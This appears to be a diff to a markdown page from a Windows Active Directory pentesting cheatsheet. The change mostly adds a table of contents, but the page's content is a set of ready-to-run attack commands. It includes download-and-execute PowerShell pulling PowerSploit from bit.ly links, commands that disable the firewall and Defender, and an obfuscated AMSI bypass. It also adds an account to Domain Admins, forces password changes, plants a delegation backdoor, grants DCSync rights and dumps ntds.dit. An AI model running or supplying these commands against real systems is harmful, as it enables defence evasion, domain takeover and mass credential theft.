@@ -6,10 +6,27 @@ categories: Pentesting Windows
 grand_parent: Cheatsheets
 has_children: true
 ---
-
 # {{ page.title}}
 
-## PRE-REQUISITE: Installing PowerUp and PowerSploit
+<!-- vscode-markdown-toc -->
+* 1. [PRE-REQUISITE: Installing PowerUp and PowerSploit](#PRE-REQUISITE:InstallingPowerUpandPowerSploit)
+* 2. [PRE-REQUISITE: SECURITY TAMPRING](#PRE-REQUISITE:SECURITYTAMPRING)
+* 3. [LATERAL MOVEMENT](#LATERALMOVEMENT)
+* 4. [PRIVESC](#PRIVESC)
+* 5. [TOKEN IMPERSONATION](#TOKENIMPERSONATION)
+* 6. [ADD MEMBER](#ADDMEMBER)
+* 7. [FORCE PASSWORD CHANGE](#FORCEPASSWORDCHANGE)
+* 8. [KERBEROASTING](#KERBEROASTING)
+* 9. [ABUSING DELEGATION](#ABUSINGDELEGATION)
+* 10. [DUMP NTDS.DIT](#DUMPNTDS.DIT)
+
+<!-- vscode-markdown-toc-config
+	numbering=true
+	autoSave=true
+	/vscode-markdown-toc-config -->
+<!-- /vscode-markdown-toc -->
+
+##  1. <a name='PRE-REQUISITE:InstallingPowerUpandPowerSploit'></a>PRE-REQUISITE: Installing PowerUp and PowerSploit
 
 - [PowerUp CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
 - [PowerSploit CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerSploit.pdf)
@@ -25,7 +42,7 @@ iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\Powe
 iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
 ```
 
-## PRE-REQUISITE: SECURITY TAMPRING
+##  2. <a name='PRE-REQUISITE:SECURITYTAMPRING'></a>PRE-REQUISITE: SECURITY TAMPRING
 ```powershell
 # windows firewall showing / disabling config 
 netsh advfirewall set allprofiles state off
@@ -63,7 +80,7 @@ Set-MpPreference -DisableIOAVProtection $true
 sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos;  + &apos;uZx&apos;  ) ( [TYpE](  "{1}{0}"-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f&apos;Util&apos;,&apos;A&apos;,&apos;Amsi&apos;,&apos;.Management.&apos;,&apos;utomation.&apos;,&apos;s&apos;,&apos;System&apos;  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f&apos;amsi&apos;,&apos;d&apos;,&apos;InitFaile&apos;  ),(  "{2}{4}{0}{1}{3}" -f &apos;Stat&apos;,&apos;i&apos;,&apos;NonPubli&apos;,&apos;c&apos;,&apos;c,&apos;  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
-## LATERAL MOVEMENT
+##  3. <a name='LATERALMOVEMENT'></a>LATERAL MOVEMENT
 ```powershell
 Invoke-DCOM
 Invoke-SMBExec
@@ -72,14 +89,14 @@ Invoke-Command
 mstsc.exe
 ```
 
-## PRIVESC
+##  4. <a name='PRIVESC'></a>PRIVESC
 ```
 Get-Hotfix
 ```
 
-## TOKEN IMPERSONATION
+##  5. <a name='TOKENIMPERSONATION'></a>TOKEN IMPERSONATION
 
-## ADD MEMBER
+##  6. <a name='ADDMEMBER'></a>ADD MEMBER
 ```
 # OPTION 1
 net group "Domain admins" dagreat /add /domain
@@ -94,7 +111,7 @@ Get-DomainGroupMember -Identity 'Domain Admins'
 ```
 
 
-## FORCE PASSWORD CHANGE
+##  7. <a name='FORCEPASSWORDCHANGE'></a>FORCE PASSWORD CHANGE
 ```
 # OPTION 1
 net user dagreat Password123! /domain
@@ -106,11 +123,11 @@ $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credential $Cred
 ```
 
-## KERBEROASTING
+##  8. <a name='KERBEROASTING'></a>KERBEROASTING
 ```
 
 ```
-## ABUSING DELEGATION
+##  9. <a name='ABUSINGDELEGATION'></a>ABUSING DELEGATION
 ```
 # configure the CD backdoor with proto transition
 Get-ADComputer -Identity <ServiceA> | Set-ADAccountControl -TrustedToAuthForDelegation $true
@@ -131,7 +148,7 @@ $idToImpersonate.Impersonate()
 Add-ObjectAcl -TargetDistinguishedName "dc=<DC01>,dc=local" -PrincipalSamAccountName <sogreatW -Rights DCSync -Verbose
 ```
 
-## DUMP NTDS.DIT
+##  10. <a name='DUMPNTDS.DIT'></a>DUMP NTDS.DIT
 ```
 ntdsutil.exe "activate instance ntds" "ifm" "Create Full C:\Temp\ntds.dmp" quit quit
 ```
